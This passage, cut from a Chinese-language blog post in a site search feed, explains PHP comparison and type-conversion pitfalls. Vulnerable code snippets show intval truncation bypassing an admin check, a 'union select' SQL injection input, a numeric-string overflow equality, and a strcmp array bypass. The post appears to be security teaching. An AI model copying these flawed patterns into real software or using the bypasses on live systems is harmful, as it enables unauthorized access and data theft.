($user_id == "1") &#123; $user_id = (int)($user_id); #$user_id = intval($user_id); $qry = "SELECT * FROM `users` WHERE user_id='$user_id';"; &#125; $result = mysql_query($qry) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); print_r(mysql_fetch_row($result)); 将user_id=0.999999999999999999999发送出去得到结果如下：123456789Array( [0] =&gt; 0 [1] =&gt; lxx&apos; [2] =&gt; [3] =&gt; [4] =&gt; [5] =&gt; ) 本来是要查询user_id的数据，结果却是user_id=0的数据。int和intval在转换数字的时候都是就低的，再如下代码:123456if ($_POST['uid'] != 1) &#123; $res = $db-&gt;query("SELECT * FROM user WHERE uid=%d", (int)$_POST['uid']); mail(...);&#125; else &#123; die("Cannot reset password of admin");&#125; 假如传入1.1，就绕过了$_POST[‘uid’]！=1的判断，就能对uid=1的用户进行操作了。另外intval还有个尽力模式，就是转换所有数字直到遇到非数字为止，如果采用:1234if (intval($qq) === &apos;123456&apos;)&#123; $db-&gt;query(&quot;select * from user where qq = $qq&quot;)&#125; 攻击者传入123456 union select version()进行攻击。 2.4 PHP5.4.4 特殊情况这个版本的php的一个修改导致两个数字型字符溢出导致比较相等12$ php -r &apos;var_dump(&quot;61529519452809720693702583126814&quot; == &quot;61529519452809720000000000000000&quot;);&apos;bool(true) 3 题外话：同样有类似问题的还有php strcmp函数,manual上是这么解释的，int strcmp ( string $str1 , string $str2 ),str1是第一个字符串，str2是第二个字符串，如果str1小于str2，返回str2,返回&gt;0,两者相等返回0，假如str2为一个array呢？12345678$_GET['key'] = array();$key = "llocdpocuzion5dcp2bindhspiccy";$flag = strcmp($key, $_GET['key']);if ($flag == 0) &#123; print "Welcome!";&#125; else &#123; print "Bad key!";&#125; 运行结果：123root@kali:~/php# php strcmp.phpPHP Warning: strcmp() expects parameter 2 to be string, array given in /root/php/strcmp.php on line 13Welcome! 参考：1，http://phpsadness.com/sad/472，http://php.net/language.operators.comparison3，http://indico.cern.ch/event/241705/material/slides/0.pdf]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>比较操作符</tag>
        <tag>Comparison operators</tag>
        <tag>安全问题</tag>
      </tags>
  </entry>
</search>